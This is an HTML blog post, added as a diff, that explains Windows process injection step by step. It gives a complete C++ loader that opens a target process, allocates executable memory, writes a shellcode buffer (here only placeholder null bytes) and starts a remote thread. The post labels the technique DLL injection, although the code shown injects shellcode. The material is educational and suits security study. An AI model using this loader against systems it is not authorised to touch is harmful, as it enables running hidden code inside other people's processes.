@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<link rel="stylesheet" href="css/post-styles.css" type="text/css" media="all"/>
+    <title>Posts</title>
+</head>
+<body>
+    <div class="content">
+        <div class="navbar">
+            <a href="../index.html">Home</a>
+			<a href="../projects.html">Projects</a>
+			<a href="../blog.html">Blog</a>
+			<a href="posts.html">Posts</a>
+        </div>
+        
+        <h1>DLL Injection TLDR;</h1>
+        <span class="date">Posted on Nov 17, 2022</span>
+        <h2>Introduction</h2>
+        <p>
+            This post gives us a simple example of performing DLL injection in Windows
+        </p>
+
+        <h2>Code Example and Documentation</h2>
+        <p>
+            Below is a C++ code snippet that demonstrates a form of process injection, 
+            specifically using the Windows API.
+        </p>
+
+<pre>
+<code>
+#include <Windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
+#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
+
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        error("Not enough parameters: program.exe <PID>");
+        return EXIT_FAILURE;
+    }
+
+    DWORD PID = atoi(argv[1]);
+    HANDLE hProcess, hThread;
+    LPVOID rBuffer;
+    DWORD TID;
+    unsigned char shell[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+    info("Trying to open a handle to the process");
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+
+    if (hProcess == NULL) {
+        error("Couldn't get a handle to the process. Error code: %d", GetLastError());
+        return EXIT_FAILURE;
+    }
+    okay("Got a handle to the process: 0x%p", hProcess);
+
+    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    if (rBuffer == NULL) {
+        error("Failed to allocate memory in the target process");
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
+    okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions", sizeof(shell));
+
+    if (!WriteProcessMemory(hProcess, rBuffer, shell, sizeof(shell), NULL)) {
+        error("Failed to write to process memory");
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
+    okay("Wrote %zu bytes to process memory", sizeof(shell));
+
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
+    if (hThread == NULL) {
+        error("Failed to create remote thread");
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
+    okay("Got a handle to the remote thread: 0x%p", hThread);
+
+    info("Waiting for thread to finish");
+    WaitForSingleObject(hThread, INFINITE);
+    okay("Thread finished executing");
+
+    info("Cleaning up...");
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    okay("Finished!");
+
+    return EXIT_SUCCESS;
+}
+</code>
+</pre>
+
+        <h3>Explanation of the Code</h3>
+
+        <h4>Importing Headers</h4>
+<pre>
+<code>
+#include <Windows.h>
+#include <stdio.h>
+#include <stdlib.h>   
+</code>
+</pre>
+        <p>
+            The Windows API, standard I/O, and the standard library headers are included for process manipulation, 
+            output printing, and utility functions, respectively.
+        </p>
+
+        <h4>Macros for Logging</h4>
+<pre>
+<code>
+#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
+#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)     
+</code>
+</pre>
+        <p>
+            Macros make logging simpler, offering a concise way to output status messages.
+        </p>
+
+        <h4>Main Function</h4>
+<pre>
+<code>
+int main(int argc, char* argv[]) 
+</code>
+</pre>
+        <p>
+            The program starts its execution here and expects a Process ID (PID) as a command-line argument.
+        </p>
+
+        <h4>Validating Arguments</h4>
+<pre>
+<code>
+if (argc < 2) {
+    error("Not enough parameters: program.exe <PID>");
+    return EXIT_FAILURE;
+}  
+</code>
+</pre>
+        <p>
+            Here, the code checks if a PID has been provided by the user. If not, it terminates the program with an error message.
+        </p>
+
+        <h4>Open Process Handle</h4>
+<pre>
+<code>
+hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); 
+</code>
+</pre>
+        <p>
+            <code>OpenProcess</code> returns a handle to the specified process, giving access to its memory and threads. 
+            The function accepts several parameters:
+            <ul>
+                <li>PROCESS_ALL_ACCESS: Grants all possible access rights to the process object.</li>
+                <li>FALSE: Indicates that the handle is not inheritable.</li>
+                <li>PID: The target process ID.</li>
+            </ul>
+        </p>
+
+        <h4>Allocate Remote Buffer</h4>
+<pre>
+<code>
+rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);  
+</code>
+</pre>
+        <p>
+            <code>VirtualAllocEx</code> allocates memory within the target process. 
+            This is where the injected code (or DLL) will reside. Parameters explained:
+            <ul>
+                <li>hProcess: The handle to the process where the memory is allocated.</li>
+                <li>NULL: The function determines where to allocate the memory.</li>
+                <li>sizeof(shell): The size of the memory to allocate.</li>
+                <li>MEM_COMMIT | MEM_RESERVE: Memory is initially committed and reserved.</li>
+                <li>PAGE_EXECUTE_READWRITE: Permissions for the allocated memory.</li>
+            </ul>
+        </p>
+
+        <h4>Write Shellcode</h4>
+<pre>
+<code>
+WriteProcessMemory(hProcess, rBuffer, shell, sizeof(shell), NULL);  
+</code>
+</pre>
+        <p>
+            <code>WriteProcessMemory</code> writes data to the memory area allocated in the target process. 
+            It effectively injects the shellcode or DLL into the process.
+        </p>
+
+        <h4>Create Remote Thread</h4>
+<pre>
+<code>
+hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);    
+</code>
+</pre>
+        <p>
+            <code>CreateRemoteThreadEx</code> creates a thread inside the target process and starts its execution at the allocated memory location.
+        </p>
+
+        <h4>Wait for Completion</h4>
+<pre>
+<code>
+WaitForSingleObject(hThread, INFINITE);   
+</code>
+</pre>
+        <p>
+            <code>WaitForSingleObject</code> suspends the calling thread until the target thread finishes its execution.
+        </p>
+
+        <h4>Cleanup</h4>
+<pre>
+<code>
+CloseHandle(hThread);
+CloseHandle(hProcess);    
+</code>
+</pre>
+        <p>
+            The handles to the process and thread are closed using <code>CloseHandle</code>, freeing resources and avoiding memory leaks.
+        </p>
+
+        <h2>Conclusion</h2>
+        <p>
+            Hopefully, this article sheds some light on the topic of DLL Injection, using Windows API as an example. 
+            Understanding these concepts can be crucial for software debugging, security research, and reverse engineering.
+            Checkout the version I made using Go on my github: <a href="https://github.com/MisterUniverse/ProcessInjector">ProcessInjector</a>.
+        </p>
+
+        <h3>Disclaimer</h3>
+        <p>
+            This code is essentially for process injection on Windows, which could be considered malicious behavior depending on its use. 
+            Use responsibly and only on systems where you have explicit permission.
+        </p>
+    </div>
+    <footer>
+		<p class="footer"><a class="copyright" href="../uncopyright.html">Uncopyrighted</a> free to use and reuse.</p>
+    </footer>
+</body>
+</html>
